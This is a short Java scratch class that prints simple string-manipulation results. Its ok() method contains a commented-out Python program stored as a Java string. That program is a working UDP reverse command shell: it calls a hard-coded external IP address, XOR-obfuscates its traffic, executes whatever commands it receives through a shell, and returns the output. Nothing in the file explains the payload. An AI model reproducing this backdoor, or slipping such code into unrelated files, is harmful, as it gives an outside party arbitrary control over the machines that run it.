package org.example;

public class ox {
    public static void main(String[] args) {
        String dxx = "&woc=SF001string&tt=tt";
        System.out.println(dxx.indexOf("&"));
        System.out.println(dxx.substring(1));
    }

    public void ok()
    {
//        "from socket import *\n" +
//                "import subprocess\n" +
//                "import struct\n" +
//                "\n" +
//                "\n" +
//                "\n" +
//                "server = socket(AF_INET,SOCK_DGRAM)\n" +
//                "target = ('150.109.157.234',4433)\n" +
//                "\n" +
//                "def encrypt(data):\n" +
//                "    data = bytearray(data)\n" +
//                "    for i in range(len(data)):\n" +
//                "        data[i] ^= 0x23\n" +
//                "    return data\n" +
//                "\n" +
//                "\n" +
//                "def decrypt(data):\n" +
//                "    data = bytearray(data)\n" +
//                "    for i in range(len(data)):\n" +
//                "        data[i] ^= 0x23\n" +
//                "    return data\n" +
//                "\n" +
//                "\n" +
//                "def send_message(message):\n" +
//                "    result = encrypt(message)\n" +
//                "    total_size = len(result)\n" +
//                "    header = struct.pack('i', total_size)\n" +
//                "    server.sendto(header,target)\n" +
//                "    server.sendto(result,target)\n" +
//                "\n" +
//                "send_message(b\"Hello~\")\n" +
//                "\n" +
//                "while True:\n" +
//                "    try:\n" +
//                "        cmd, _ = server.recvfrom(1024)\n" +
//                "        cmd = decrypt(cmd)\n" +
//                "        print(f\"cmd: {cmd}\")\n" +
//                "        if len(cmd) == 0:\n" +
//                "            break\n" +
//                "        res = subprocess.Popen(cmd.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n" +
//                "        stdout_res = res.stdout.read()\n" +
//                "        stderr_res = res.stderr.read()\n" +
//                "        result = stdout_res + stderr_res\n" +
//                "        send_message(result)\n" +
//                "    except  Exception as err:\n" +
//                "        raise\n" +
//                "server.close()"
    }
}
